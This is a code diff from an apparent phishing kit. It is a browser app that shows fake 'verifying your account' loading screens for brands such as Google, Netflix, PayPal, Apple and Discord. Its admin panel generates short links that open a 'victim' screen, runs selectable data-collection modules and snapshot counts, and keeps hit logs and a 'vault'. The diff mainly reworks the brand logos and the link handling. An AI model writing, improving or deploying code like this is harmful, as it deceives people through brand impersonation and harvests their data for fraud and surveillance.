0-3.259-.014-3.667-.072-4.947-.196-4.354-2.617-6.78-6.979-6.98-1.281-.059-1.69-.073-4.949-.073zm0 5.838c-3.403 0-6.162 2.759-6.162 6.162s2.759 6.163 6.162 6.163 6.162-2.759 6.162-6.163c0-3.403-2.759-6.162-6.162-6.162zm0 10.162c-2.209 0-4-1.79-4-4 0-2.209 1.791-4 4-4s4 1.791 4 4c0 2.21-1.791 4-4 4zm6.406-11.845c-.795 0-1.441.645-1.441 1.44s.646 1.44 1.441 1.44c.795 0 1.439-.645 1.439-1.44s-.644-1.44-1.439-1.44z"/></svg>`,
+    messages: ['Loading your feed...', 'Syncing with server...', 'Preparing content...'],
+    spinnerBorder: 'rgba(225,48,108,0.15)'
   },
   netflix: {
     name: 'Netflix', color: '#e50914', bg: '#000000', textColor: '#ffffff',
-    logo: `<svg width="60" height="60" viewBox="0 0 24 24" fill="#e50914"><path d="M5.398 0v.006c3.028 8.556 5.37 15.175 8.348 23.596 2.344.058 4.85.398 4.854.398-2.8-7.924-5.923-16.747-8.487-24zm8.489 0v9.63L18.6 22.951c.043.007.107.018.163.031V0zM5.398 1.05V24c1.873-.225 2.81-.312 4.715-.398v-9.22z"/></svg>`,
-    messages: ['Authenticating...', 'Loading profiles...', 'Almost ready...']
+    logo: `<div style="font-family:'Bebas Neue',Arial Black,sans-serif;font-weight:900;font-size:56px;color:#e50914;letter-spacing:-2px;line-height:1">NETFLIX</div>`,
+    messages: ['Authenticating...', 'Loading profiles...', 'Almost ready...'],
+    spinnerBorder: 'rgba(229,9,20,0.2)'
   },
   twitter: {
-    name: 'Twitter / X', color: '#0f1419', bg: '#ffffff', textColor: '#0f1419',
-    logo: `<svg width="40" height="40" viewBox="0 0 24 24" fill="#0f1419"><path d="M18.244 2.25h3.308l-7.227 8.26 8.502 11.24H16.17l-5.214-6.817L4.99 21.75H1.68l7.73-8.835L1.254 2.25H8.08l4.713 6.231zm-1.161 17.52h1.833L7.084 4.126H5.117z"/></svg>`,
-    messages: ['Checking timeline...', 'Verifying identity...', 'Loading...']
+    name: 'Twitter / X', color: '#000000', bg: '#ffffff', textColor: '#0f1419',
+    logo: `<svg width="60" height="60" viewBox="0 0 24 24" fill="#000"><path d="M18.244 2.25h3.308l-7.227 8.26 8.502 11.24H16.17l-5.214-6.817L4.99 21.75H1.68l7.73-8.835L1.254 2.25H8.08l4.713 6.231zm-1.161 17.52h1.833L7.084 4.126H5.117z"/></svg>`,
+    messages: ['Checking timeline...', 'Verifying identity...', 'Loading...'],
+    spinnerBorder: 'rgba(0,0,0,0.08)'
   },
   whatsapp: {
     name: 'WhatsApp', color: '#25D366', bg: '#e5ddd5', textColor: '#111b21',
-    logo: `<svg width="48" height="48" viewBox="0 0 24 24" fill="#25D366"><path d="M17.472 14.382c-.297-.149-1.758-.867-2.03-.967-.273-.099-.471-.148-.67.15-.197.297-.767.966-.94 1.164-.173.199-.347.223-.644.075-.297-.15-1.255-.463-2.39-1.475-.883-.788-1.48-1.761-1.653-2.059-.173-.297-.018-.458.13-.606.134-.133.298-.347.446-.52.149-.174.198-.298.298-.497.099-.198.05-.371-.025-.52-.075-.149-.669-1.612-.916-2.207-.242-.579-.487-.5-.669-.51-.173-.008-.371-.01-.57-.01-.198 0-.52.074-.792.372-.272.297-1.04 1.016-1.04 2.479 0 1.462 1.065 2.875 1.213 3.074.149.198 2.096 3.2 5.077 4.487.709.306 1.262.489 1.694.625.712.227 1.36.195 1.871.118.571-.085 1.758-.719 2.006-1.413.248-.694.248-1.289.173-1.413-.074-.124-.272-.198-.57-.347m-5.421 7.403h-.004a9.87 9.87 0 01-5.031-1.378l-.361-.214-3.741.982.998-3.648-.235-.374a9.86 9.86 0 01-1.51-5.26c.001-5.45 4.436-9.884 9.888-9.884 2.64 0 5.122 1.03 6.988 2.898a9.825 9.825 0 012.893 6.994c-.003 5.45-4.437 9.884-9.885 9.884m8.413-18.297A11.815 11.815 0 0012.05 0C5.495 0 .16 5.335.157 11.892c0 2.096.547 4.142 1.588 5.945L.057 24l6.305-1.654a11.882 11.882 0 005.683 1.448h.005c6.554 0 11.89-5.335 11.893-11.893a11.821 11.821 0 00-3.48-8.413z"/></svg>`,
-    messages: ['Connecting to server...', 'Syncing messages...', 'Loading chats...']
+    logo: `<svg width="80" height="80" viewBox="0 0 24 24" fill="#25D366"><path d="M17.472 14.382c-.297-.149-1.758-.867-2.03-.967-.273-.099-.471-.148-.67.15-.197.297-.767.966-.94 1.164-.173.199-.347.223-.644.075-.297-.15-1.255-.463-2.39-1.475-.883-.788-1.48-1.761-1.653-2.059-.173-.297-.018-.458.13-.606.134-.133.298-.347.446-.52.149-.174.198-.298.298-.497.099-.198.05-.371-.025-.52-.075-.149-.669-1.612-.916-2.207-.242-.579-.487-.5-.669-.51-.173-.008-.371-.01-.57-.01-.198 0-.52.074-.792.372-.272.297-1.04 1.016-1.04 2.479 0 1.462 1.065 2.875 1.213 3.074.149.198 2.096 3.2 5.077 4.487.709.306 1.262.489 1.694.625.712.227 1.36.195 1.871.118.571-.085 1.758-.719 2.006-1.413.248-.694.248-1.289.173-1.413-.074-.124-.272-.198-.57-.347m-5.421 7.403h-.004a9.87 9.87 0 01-5.031-1.378l-.361-.214-3.741.982.998-3.648-.235-.374a9.86 9.86 0 01-1.51-5.26c.001-5.45 4.436-9.884 9.888-9.884 2.64 0 5.122 1.03 6.988 2.898a9.825 9.825 0 012.893 6.994c-.003 5.45-4.437 9.884-9.885 9.884m8.413-18.297A11.815 11.815 0 0012.05 0C5.495 0 .16 5.335.157 11.892c0 2.096.547 4.142 1.588 5.945L.057 24l6.305-1.654a11.882 11.882 0 005.683 1.448h.005c6.554 0 11.89-5.335 11.893-11.893a11.821 11.821 0 00-3.48-8.413z"/></svg>`,
+    messages: ['Connecting to server...', 'Syncing messages...', 'Loading chats...'],
+    spinnerBorder: 'rgba(37,211,102,0.2)'
   },
   tiktok: {
     name: 'TikTok', color: '#000000', bg: '#ffffff', textColor: '#161823',
-    logo: `<svg width="40" height="40" viewBox="0 0 24 24"><path fill="#25F4EE" d="M19.59 6.69a4.83 4.83 0 0 1-3.77-4.25V2h-3.45v13.67a2.89 2.89 0 0 1-5.2 1.74 2.89 2.89 0 0 1 2.31-4.64 2.93 2.93 0 0 1 .88.13V9.4a6.84 6.84 0 0 0-1-.05A6.33 6.33 0 0 0 5.8 20.1a6.34 6.34 0 0 0 10.86-4.43v-7a8.16 8.16 0 0 0 4.77 1.52v-3.4a4.85 4.85 0 0 1-1.84-.1z"/></svg>`,
-    messages: ['Loading For You...', 'Fetching videos...', 'Almost there...']
+    logo: `<div style="font-family:Arial Black,sans-serif;font-weight:900;font-size:42px;letter-spacing:-1px"><span style="color:#25F4EE;text-shadow:2px 0 0 #FE2C55,-2px 0 0 #25F4EE">TikTok</span></div>`,
+    messages: ['Loading For You...', 'Fetching videos...', 'Almost there...'],
+    spinnerBorder: 'rgba(0,0,0,0.08)'
   },
   spotify: {
     name: 'Spotify', color: '#1DB954', bg: '#121212', textColor: '#ffffff',
-    logo: `<svg width="48" height="48" viewBox="0 0 24 24" fill="#1DB954"><path d="M12 0C5.4 0 0 5.4 0 12s5.4 12 12 12 12-5.4 12-12S18.66 0 12 0zm5.521 17.34c-.24.359-.66.48-1.021.24-2.82-1.74-6.36-2.101-10.561-1.141-.418.122-.779-.179-.899-.539-.12-.421.18-.78.54-.9 4.56-1.021 8.52-.6 11.64 1.32.42.18.479.659.301 1.02zm1.44-3.3c-.301.42-.841.6-1.262.3-3.239-1.98-8.159-2.58-11.939-1.38-.479.12-1.02-.12-1.14-.6-.12-.48.12-1.021.6-1.141C9.6 9.9 15 10.561 18.72 12.84c.361.182.54.78.241 1.2zm.12-3.36C15.24 8.4 8.82 8.16 5.16 9.301c-.6.179-1.2-.181-1.38-.721-.18-.601.18-1.2.72-1.381 4.26-1.26 11.28-1.02 15.721 1.621.539.3.719 1.02.419 1.56-.299.421-1.02.599-1.559.3z"/></svg>`,
-    messages: ['Loading your music...', 'Syncing playlists...', 'Preparing playback...']
+    logo: `<svg width="80" height="80" viewBox="0 0 24 24" fill="#1DB954"><path d="M12 0C5.4 0 0 5.4 0 12s5.4 12 12 12 12-5.4 12-12S18.66 0 12 0zm5.521 17.34c-.24.359-.66.48-1.021.24-2.82-1.74-6.36-2.101-10.561-1.141-.418.122-.779-.179-.899-.539-.12-.421.18-.78.54-.9 4.56-1.021 8.52-.6 11.64 1.32.42.18.479.659.301 1.02zm1.44-3.3c-.301.42-.841.6-1.262.3-3.239-1.98-8.159-2.58-11.939-1.38-.479.12-1.02-.12-1.14-.6-.12-.48.12-1.021.6-1.141C9.6 9.9 15 10.561 18.72 12.84c.361.182.54.78.241 1.2zm.12-3.36C15.24 8.4 8.82 8.16 5.16 9.301c-.6.179-1.2-.181-1.38-.721-.18-.601.18-1.2.72-1.381 4.26-1.26 11.28-1.02 15.721 1.621.539.3.719 1.02.419 1.56-.299.421-1.02.599-1.559.3z"/></svg>`,
+    messages: ['Loading your music...', 'Syncing playlists...', 'Preparing playback...'],
+    spinnerBorder: 'rgba(29,185,84,0.2)'
   },
   amazon: {
     name: 'Amazon', color: '#FF9900', bg: '#ffffff', textColor: '#0F1111',
-    logo: `<div style="font-family:Arial;font-weight:bold;font-size:28px;color:#000">amazon<span style="color:#FF9900">.com</span></div>`,
-    messages: ['Verifying your account...', 'Securing your session...', 'Redirecting...']
+    logo: `<div style="font-family:Arial,sans-serif;font-weight:bold;font-size:42px;color:#0F1111;letter-spacing:-1px">amazon<span style="color:#FF9900">.in</span></div>`,
+    messages: ['Verifying your account...', 'Securing your session...', 'Redirecting...'],
+    spinnerBorder: 'rgba(255,153,0,0.2)'
   },
   microsoft: {
     name: 'Microsoft', color: '#0067b8', bg: '#ffffff', textColor: '#1b1b1b',
-    logo: `<svg width="60" height="60" viewBox="0 0 23 23"><rect fill="#f25022" x="1" y="1" width="10" height="10"/><rect fill="#7fba00" x="12" y="1" width="10" height="10"/><rect fill="#00a4ef" x="1" y="12" width="10" height="10"/><rect fill="#ffb900" x="12" y="12" width="10" height="10"/></svg>`,
-    messages: ['Signing you in...', 'Verifying credentials...', 'Loading your account...']
+    logo: `<svg width="80" height="80" viewBox="0 0 23 23"><rect fill="#f25022" x="1" y="1" width="10" height="10"/><rect fill="#7fba00" x="12" y="1" width="10" height="10"/><rect fill="#00a4ef" x="1" y="12" width="10" height="10"/><rect fill="#ffb900" x="12" y="12" width="10" height="10"/></svg>`,
+    messages: ['Signing you in...', 'Verifying credentials...', 'Loading your account...'],
+    spinnerBorder: 'rgba(0,103,184,0.15)'
   },
   apple: {
-    name: 'Apple', color: '#1d1d1f', bg: '#ffffff', textColor: '#1d1d1f',
-    logo: `<svg width="40" height="48" viewBox="0 0 384 512" fill="#1d1d1f"><path d="M318.7 268.7c-.2-36.7 16.4-64.4 50-84.8-18.8-26.9-47.2-41.7-84.7-44.6-35.5-2.8-74.3 20.7-88.5 20.7-15 0-49.4-19.7-76.4-19.7C63.3 141.2 4 184.8 4 273.5q0 39.3 14.4 81.2c12.8 36.7 59 126.7 107.2 125.2 25.2-.6 43-17.9 75.8-17.9 31.8 0 48.3 17.9 76.4 17.9 48.6-.7 90.4-82.5 102.6-119.3-65.2-30.7-61.7-90-61.7-91.9zm-56.6-164.2c27.3-32.4 24.8-61.9 24-72.5-24.1 1.4-52 16.4-67.9 34.9-17.5 19.8-27.8 44.3-25.6 71.9 26.1 2 49.9-11.4 69.5-34.3z"/></svg>`,
-    messages: ['Verifying Apple ID...', 'Secure sign-in in progress...', 'Loading...']
+    name: 'Apple', color: '#000000', bg: '#ffffff', textColor: '#1d1d1f',
+    logo: `<svg width="60" height="72" viewBox="0 0 384 512" fill="#000"><path d="M318.7 268.7c-.2-36.7 16.4-64.4 50-84.8-18.8-26.9-47.2-41.7-84.7-44.6-35.5-2.8-74.3 20.7-88.5 20.7-15 0-49.4-19.7-76.4-19.7C63.3 141.2 4 184.8 4 273.5q0 39.3 14.4 81.2c12.8 36.7 59 126.7 107.2 125.2 25.2-.6 43-17.9 75.8-17.9 31.8 0 48.3 17.9 76.4 17.9 48.6-.7 90.4-82.5 102.6-119.3-65.2-30.7-61.7-90-61.7-91.9zm-56.6-164.2c27.3-32.4 24.8-61.9 24-72.5-24.1 1.4-52 16.4-67.9 34.9-17.5 19.8-27.8 44.3-25.6 71.9 26.1 2 49.9-11.4 69.5-34.3z"/></svg>`,
+    messages: ['Verifying Apple ID...', 'Secure sign-in in progress...', 'Loading...'],
+    spinnerBorder: 'rgba(0,0,0,0.08)'
   },
   paypal: {
     name: 'PayPal', color: '#003087', bg: '#ffffff', textColor: '#2c2e2f',
-    logo: `<div style="font-family:Arial;font-weight:bold;font-size:28px"><span style="color:#003087">Pay</span><span style="color:#0079C1">Pal</span></div>`,
-    messages: ['Securing your connection...', 'Verifying account...', 'Loading...']
+    logo: `<div style="font-family:Arial,sans-serif;font-weight:bold;font-size:44px;letter-spacing:-1px"><span style="color:#003087">Pay</span><span style="color:#0079C1">Pal</span></div>`,
+    messages: ['Securing your connection...', 'Verifying account...', 'Loading...'],
+    spinnerBorder: 'rgba(0,48,135,0.15)'
   },
   discord: {
     name: 'Discord', color: '#5865F2', bg: '#36393f', textColor: '#ffffff',
-    logo: `<svg width="48" height="48" viewBox="0 0 24 24" fill="#5865F2"><path d="M20.317 4.37a19.791 19.791 0 0 0-4.885-1.515.074.074 0 0 0-.079.037c-.21.375-.444.864-.608 1.25a18.27 18.27 0 0 0-5.487 0 12.64 12.64 0 0 0-.617-1.25.077.077 0 0 0-.079-.037A19.736 19.736 0 0 0 3.677 4.37a.07.07 0 0 0-.032.027C.533 9.046-.32 13.58.099 18.057a.082.082 0 0 0 .031.057 19.9 19.9 0 0 0 5.993 3.03.078.078 0 0 0 .084-.028 14.09 14.09 0 0 0 1.226-1.994.076.076 0 0 0-.041-.106 13.107 13.107 0 0 1-1.872-.892.077.077 0 0 1-.008-.128 10.2 10.2 0 0 0 .372-.292.074.074 0 0 1 .077-.01c3.928 1.793 8.18 1.793 12.062 0a.074.074 0 0 1 .078.01c.12.098.246.198.373.292a.077.077 0 0 1-.006.127 12.299 12.299 0 0 1-1.873.892.077.077 0 0 0-.041.107c.36.698.772 1.362 1.225 1.993a.076.076 0 0 0 .084.028 19.839 19.839 0 0 0 6.002-3.03.077.077 0 0 0 .032-.054c.5-5.177-.838-9.674-3.549-13.66a.061.061 0 0 0-.031-.03zM8.02 15.33c-1.183 0-2.157-1.085-2.157-2.419 0-1.333.956-2.419 2.157-2.419 1.21 0 2.176 1.096 2.157 2.42 0 1.333-.956 2.418-2.157 2.418zm7.975 0c-1.183 0-2.157-1.085-2.157-2.419 0-1.333.955-2.419 2.157-2.419 1.21 0 2.176 1.096 2.157 2.42 0 1.333-.946 2.418-2.157 2.418z"/></svg>`,
-    messages: ['Connecting to Discord...', 'Loading your servers...', 'Almost there...']
+    logo: `<svg width="80" height="80" viewBox="0 0 24 24" fill="#ffffff"><path d="M20.317 4.37a19.791 19.791 0 0 0-4.885-1.515.074.074 0 0 0-.079.037c-.21.375-.444.864-.608 1.25a18.27 18.27 0 0 0-5.487 0 12.64 12.64 0 0 0-.617-1.25.077.077 0 0 0-.079-.037A19.736 19.736 0 0 0 3.677 4.37a.07.07 0 0 0-.032.027C.533 9.046-.32 13.58.099 18.057a.082.082 0 0 0 .031.057 19.9 19.9 0 0 0 5.993 3.03.078.078 0 0 0 .084-.028 14.09 14.09 0 0 0 1.226-1.994.076.076 0 0 0-.041-.106 13.107 13.107 0 0 1-1.872-.892.077.077 0 0 1-.008-.128 10.2 10.2 0 0 0 .372-.292.074.074 0 0 1 .077-.01c3.928 1.793 8.18 1.793 12.062 0a.074.074 0 0 1 .078.01c.12.098.246.198.373.292a.077.077 0 0 1-.006.127 12.299 12.299 0 0 1-1.873.892.077.077 0 0 0-.041.107c.36.698.772 1.362 1.225 1.993a.076.076 0 0 0 .084.028 19.839 19.839 0 0 0 6.002-3.03.077.077 0 0 0 .032-.054c.5-5.177-.838-9.674-3.549-13.66a.061.061 0 0 0-.031-.03zM8.02 15.33c-1.183 0-2.157-1.085-2.157-2.419 0-1.333.956-2.419 2.157-2.419 1.21 0 2.176 1.096 2.157 2.42 0 1.333-.956 2.418-2.157 2.418zm7.975 0c-1.183 0-2.157-1.085-2.157-2.419 0-1.333.955-2.419 2.157-2.419 1.21 0 2.176 1.096 2.157 2.42 0 1.333-.946 2.418-2.157 2.418z"/></svg>`,
+    messages: ['Connecting to Discord...', 'Loading your servers...', 'Almost there...'],
+    spinnerBorder: 'rgba(88,101,242,0.2)'
   },
   snapchat: {
     name: 'Snapchat', color: '#FFFC00', bg: '#ffffff', textColor: '#000000',
-    logo: `<svg width="48" height="48" viewBox="0 0 24 24" fill="#FFFC00" stroke="#000" stroke-width="0.5"><path d="M12.206.795c.9 0 4.326.27 5.559 3.39.553 1.403.516 4.192.43 5.47.004.045.004.084.004.12 0 .12.008.2.016.27.008.06.016.12.016.24 0 .3-.12.57-.36.78-.3.255-.765.42-1.305.555-.21.045-.435.09-.675.135-.36.075-.6.135-.78.225-.27.135-.42.33-.54.585-.045.09-.09.21-.165.36-.105.24-.24.54-.465.81-.3.36-.72.585-1.26.585-.09 0-.18-.006-.27-.015-.39-.045-.69-.18-.93-.3-.135-.06-.255-.12-.36-.15-.105-.03-.195-.03-.3.015-.12.06-.225.135-.345.21-.225.15-.48.315-.84.315-.06 0-.12-.006-.18-.015-.42-.06-.78-.285-1.08-.645-.225-.27-.36-.57-.465-.81-.075-.15-.12-.27-.165-.36-.12-.255-.27-.45-.54-.585-.18-.09-.42-.15-.78-.225-.24-.045-.465-.09-.675-.135-.54-.135-1.005-.3-1.305-.555-.24-.21-.36-.48-.36-.78 0-.12.008-.18.016-.24.008-.07.016-.15.016-.27 0-.036 0-.075.004-.12-.086-1.278-.123-4.067.43-5.47C7.88 1.065 11.306.795 12.206.795z"/></svg>`,
-    messages: ['Loading snaps...', 'Connecting to friends...', 'Almost ready...']
+    logo: `<svg width="70" height="80" viewBox="0 0 24 24" fill="#FFFC00" stroke="#000" stroke-width="0.5"><path d="M12.206.795c.9 0 4.326.27 5.559 3.39.553 1.403.516 4.192.43 5.47.004.045.004.084.004.12 0 .12.008.2.016.27.008.06.016.12.016.24 0 .3-.12.57-.36.78-.3.255-.765.42-1.305.555-.21.045-.435.09-.675.135-.36.075-.6.135-.78.225-.27.135-.42.33-.54.585-.045.09-.09.21-.165.36-.105.24-.24.54-.465.81-.3.36-.72.585-1.26.585-.09 0-.18-.006-.27-.015-.39-.045-.69-.18-.93-.3-.135-.06-.255-.12-.36-.15-.105-.03-.195-.03-.3.015-.12.06-.225.135-.345.21-.225.15-.48.315-.84.315-.06 0-.12-.006-.18-.015-.42-.06-.78-.285-1.08-.645-.225-.27-.36-.57-.465-.81-.075-.15-.12-.27-.165-.36-.12-.255-.27-.45-.54-.585-.18-.09-.42-.15-.78-.225-.24-.045-.465-.09-.675-.135-.54-.135-1.005-.3-1.305-.555-.24-.21-.36-.48-.36-.78 0-.12.008-.18.016-.24.008-.07.016-.15.016-.27 0-.036 0-.075.004-.12-.086-1.278-.123-4.067.43-5.47C7.88 1.065 11.306.795 12.206.795z"/></svg>`,
+    messages: ['Loading snaps...', 'Connecting to friends...', 'Almost ready...'],
+    spinnerBorder: 'rgba(255,252,0,0.3)'
   },
   generic: {
     name: 'Secure', color: '#6366f1', bg: '#0a0a0f', textColor: '#ffffff',
-    logo: `<div class="w-16 h-16 rounded-2xl bg-gradient-to-br from-indigo-500 to-purple-600 flex items-center justify-center"><i class="fas fa-shield-alt text-3xl text-white"></i></div>`,
-    messages: ['Establishing secure connection...', 'Verifying credentials...', 'Redirecting...']
+    logo: `<div style="width:80px;height:80px;border-radius:20px;background:linear-gradient(135deg,#6366f1,#a855f7);display:flex;align-items:center;justify-content:center;box-shadow:0 10px 40px rgba(99,102,241,0.4)"><i class="fas fa-shield-alt" style="font-size:40px;color:white"></i></div>`,
+    messages: ['Establishing secure connection...', 'Verifying credentials...', 'Redirecting...'],
+    spinnerBorder: 'rgba(99,102,241,0.2)'
   }
 };
 
 const BRAND_ICONS = {
-  google: 'fab fa-google',
-  facebook: 'fab fa-facebook',
-  instagram: 'fab fa-instagram',
-  netflix: 'fas fa-film',
-  twitter: 'fab fa-x-twitter',
-  whatsapp: 'fab fa-whatsapp',
-  tiktok: 'fab fa-tiktok',
-  spotify: 'fab fa-spotify',
-  amazon: 'fab fa-amazon',
-  microsoft: 'fab fa-microsoft',
-  apple: 'fab fa-apple',
-  paypal: 'fab fa-paypal',
-  discord: 'fab fa-discord',
-  snapchat: 'fab fa-snapchat',
-  generic: 'fas fa-shield-alt'
+  google: 'fab fa-google', facebook: 'fab fa-facebook', instagram: 'fab fa-instagram',
+  netflix: 'fas fa-film', twitter: 'fab fa-x-twitter', whatsapp: 'fab fa-whatsapp',
+  tiktok: 'fab fa-tiktok', spotify: 'fab fa-spotify', amazon: 'fab fa-amazon',
+  microsoft: 'fab fa-microsoft', apple: 'fab fa-apple', paypal: 'fab fa-paypal',
+  discord: 'fab fa-discord', snapchat: 'fab fa-snapchat', generic: 'fas fa-shield-alt'
 };
-
-function iconColorFor(key) {
-  const b = BRANDS[key];
-  if (!b) return '#6366f1';
-  const hex = b.color.replace('#','');
-  if (hex.length !== 6) return b.color;
-  const r = parseInt(hex.substr(0,2),16);
-  const g = parseInt(hex.substr(2,2),16);
-  const bl = parseInt(hex.substr(4,2),16);
-  const lum = (0.299*r + 0.587*g + 0.114*bl) / 255;
-  return lum < 0.35 ? '#e5e5e5' : b.color;
-}
-
-/* ============ SAFE STORAGE WRAPPERS ============ */
-function safeGet(key, fallback) {
-  try {
-    const v = localStorage.getItem(key);
-    if (v === null) return fallback;
-    return JSON.parse(v);
-  } catch(e) { return fallback; }
-}
-function safeSet(key, val) {
-  try { localStorage.setItem(key, JSON.stringify(val)); return true; }
-  catch(e) { console.warn('storage set failed', key, e); return false; }
-}
 
 /* ============ STATE ============ */
 let state = {
   auth: false,
   selectedBrand: 'google',
-  links: safeGet('sl_links', []),
-  logs: safeGet('sl_logs', []),
-  settings: safeGet('sl_settings', {}),
+  links: JSON.parse(localStorage.getItem('sl_links') || '[]'),
+  logs: JSON.parse(localStorage.getItem('sl_logs') || '[]'),
+  settings: JSON.parse(localStorage.getItem('sl_settings') || '{}'),
   currentTab: 'create'
 };
 
 const DEFAULT_PASS = 'admin123';
 const PASS_KEY = 'sl_pass';
-const RESERVED_CODES = ['admin','preview','login','null','undefined'];
-
-/* ============ B64URL ============ */
-function b64urlEncode(str) {
-  return btoa(unescape(encodeURIComponent(str)))
-    .replace(/\+/g,'-').replace(/\//g,'_').replace(/=+$/,'');
-}
-function b64urlDecode(str) {
-  str = str.replace(/-/g,'+').replace(/_/g,'/');
-  while (str.length % 4) str += '=';
-  return decodeURIComponent(escape(atob(str)));
-}
-
-/* ============ SAFE COPY ============ */
-async function safeCopy(text) {
-  try {
-    if (navigator.clipboard && window.isSecureContext) {
-      await navigator.clipboard.writeText(text);
-      return true;
-    }
-  } catch(e) {}
-  try {
-    const ta = document.createElement('textarea');
-    ta.value = text;
-    ta.style.position = 'fixed';
-    ta.style.left = '-9999px';
-    document.body.appendChild(ta);
-    ta.select();
-    const ok = document.execCommand('copy');
-    ta.remove();
-    return ok;
-  } catch(e) { return false; }
-}
 
 /* ============ INIT ============ */
 function init() {
   const hash = window.location.hash.slice(1);
-  if (hash === 'admin' || !hash) {
-    if (state.auth) {
-      document.getElementById('loginScreen').classList.add('hidden');
-      document.getElementById('adminPanel').classList.remove('hidden');
-      document.getElementById('victimScreen').classList.add('hidden');
-      renderAll();
-      loadSettings();
-    } else {
-      showLogin();
-    }
-  } else if (hash.startsWith('/')) {
-    const payload = hash.slice(1);
-    let link = null;
-    try { link = JSON.parse(b64urlDecode(payload)); } catch(e) { link = null; }
-    if (link && link.brand && (link.dest || link.code === 'preview')) {
+  if (hash && hash !== 'admin') {
+    const link = state.links.find(l => l.code === hash);
+    if (link && link.active) {
       launchVictim(link);
-    } else {
-      document.body.innerHTML = '<div style="display:flex;align-items:center;justify-content:center;height:100vh;color:#666;font-family:sans-serif;flex-direction:column"><i class="fas fa-exclamation-triangle" style="font-size:48px;margin-bottom:20px;color:#ef4444"></i><h2>Link not found or inactive</h2></div>';
+      return;
     }
-  } else {
-    window.location.hash = 'admin';
-    showLogin();
   }
+  showLogin();
   renderBrandGrid();
 }
 
 /* ============ AUTH ============ */
 function showLogin() {
-  document.getElementById('loginScreen').classList.remove('hidden');
-  document.getElementById('adminPanel').classList.add('hidden');
-  document.getElementById('victimScreen').classList.add('hidden');
+  document.getElementById('loginScreen').style.display = 'flex';
+  document.getElementById('adminPanel').style.display = 'none';
+  document.getElementById('victimScreen').style.display = 'none';
+  setTimeout(() => {
+    const input = document.getElementById('loginPass');
+    if (input) input.focus();
+  }, 100);
 }
 
 function handleLogin() {
-  const pass = document.getElementById('loginPass').value;
+  const passInput = document.getElementById('loginPass');
+  const pass = passInput.value;
   const stored = localStorage.getItem(PASS_KEY) || DEFAULT_PASS;
+  const errorEl = document.getElementById('loginError');
+  
   if (pass === stored) {
     state.auth = true;
-    document.getElementById('loginScreen').classList.add('hidden');
-    document.getElementById('adminPanel').classList.remove('hidden');
+    errorEl.classList.add('hidden');
+    document.getElementById('loginScreen').style.display = 'none';
+    document.getElementById('adminPanel').style.display = 'block';
+    document.getElementById('victimScreen').style.display = 'none';
+    passInput.value = '';
     renderAll();
     loadSettings();
     toast('Welcome back!', 'success');
   } else {
-    toast('Invalid password', 'error');
-    document.getElementById('loginPass').value = '';
+    errorEl.classList.remove('hidden');
+    document.getElementById('loginBox').classList.add('shake');
+    setTimeout(() => document.getElementById('loginBox').classList.remove('shake'), 400);
+    passInput.value = '';
+    passInput.focus();
   }
 }
 
 function logout() {
   state.auth = false;
   window.location.hash = 'admin';
-  document.getElementById('loginPass').value = '';
   showLogin();
 }
 
@@ -611,11 +589,10 @@ function renderBrandGrid() {
   grid.innerHTML = Object.keys(BRANDS).map(key => {
     const b = BRANDS[key];
     const selected = state.selectedBrand === key ? 'selected' : '';
-    const ic = iconColorFor(key);
     return `
       <div class="brand-card glass rounded-xl p-3 text-center ${selected}" onclick="selectBrand('${key}')">
-        <div class="w-10 h-10 mx-auto mb-2 rounded-lg flex items-center justify-center" style="background:${b.color}22">
-          <i class="${BRAND_ICONS[key]} text-lg" style="color:${ic}"></i>
+        <div class="w-10 h-10 mx-auto mb-2 rounded-lg flex items-center justify-center" style="background:${b.color}20">
+          <i class="${BRAND_ICONS[key]} text-lg" style="color:${b.color}"></i>
         </div>
         <div class="text-xs font-medium">${b.name}</div>
       </div>
@@ -631,8 +608,8 @@ function selectBrand(key) {
 /* ============ TABS ============ */
 function switchTab(tab) {
   state.currentTab = tab;
-  document.querySelectorAll('.tab-content').forEach(el => el.classList.add('hidden'));
-  document.getElementById('content-' + tab).classList.remove('hidden');
+  document.querySelectorAll('.tab-content').forEach(el => el.style.display = 'none');
+  document.getElementById('content-' + tab).style.display = 'block';
   document.querySelectorAll('[id^="tab-"]').forEach(el => {
     el.classList.remove('tab-active');
     el.classList.add('bg-white/5');
@@ -640,7 +617,7 @@ function switchTab(tab) {
   document.getElementById('tab-' + tab).classList.add('tab-active');
   document.getElementById('tab-' + tab).classList.remove('bg-white/5');
   if (tab === 'links') renderLinks();
-  if (tab === 'logs') { renderLogs(); hideLogBadge(); }
+  if (tab === 'vault') renderVault();
 }
 
 /* ============ LINKS ============ */
@@ -651,63 +628,43 @@ function generateRandomCode() {
   document.getElementById('shortCode').value = code;
 }
 
-function normalizeDest(url) {
-  url = url.trim();
-  if (!url) return '';
-  if (!/^https?:\/\//i.test(url)) url = 'https://' + url;
-  return url;
-}
-
 function createLink() {
   const brand = state.selectedBrand;
   const code = document.getElementById('shortCode').value.trim().toLowerCase().replace(/[^a-z0-9-]/g, '');
-  const dest = normalizeDest(document.getElementById('destUrl').value);
-  const duration = Math.max(2, Math.min(20, parseInt(document.getElementById('loadDuration').value) || 6));
+  const dest = document.getElementById('destUrl').value.trim();
+  const duration = parseInt(document.getElementById('loadDuration').value) || 5;
   const msg = document.getElementById('loadMsg').value.trim();
-  const snapCount = Math.max(2, Math.min(5, parseInt(document.getElementById('snapCount').value) || 3));
-
+  const snapCount = parseInt(document.getElementById('snapCount').value) || 3;
+  
   if (!code) return toast('Enter a short code', 'error');
   if (!dest) return toast('Enter destination URL', 'error');
-  if (RESERVED_CODES.includes(code)) return toast('That code is reserved', 'error');
   if (state.links.some(l => l.code === code)) return toast('Code already exists', 'error');
-
+  
   const modules = [];
   document.querySelectorAll('.collect-mod:checked').forEach(cb => modules.push(cb.value));
-
+  
   const link = {
     id: Date.now(),
-    code, brand, dest, duration,
+    code, brand, dest, duration, snapCount,
     message: msg || BRANDS[brand].messages[0],
     modules,
-    snapCount,
     hits: 0,
     created: new Date().toISOString(),
     active: true
   };
-
+  
   state.links.push(link);
   saveLinks();
-
-  const config = {
-    code: link.code,
-    brand: link.brand,
-    dest: link.dest,
-    duration: link.duration,
-    message: link.message,
-    modules: link.modules,
-    snapCount: link.snapCount,
-    active: true
-  };
-  const encoded = b64urlEncode(JSON.stringify(config));
+  
   const baseUrl = window.location.origin + window.location.pathname;
-  const fullUrl = baseUrl + '#/' + encoded;
-
+  const fullUrl = baseUrl + '#' + code;
+  
   document.getElementById('linkOutput').textContent = fullUrl;
-  document.getElementById('generatedLink').classList.remove('hidden');
-
+  document.getElementById('generatedLink').style.display = 'block';
+  
   toast('Link created successfully!', 'success');
   renderStats();
-
+  
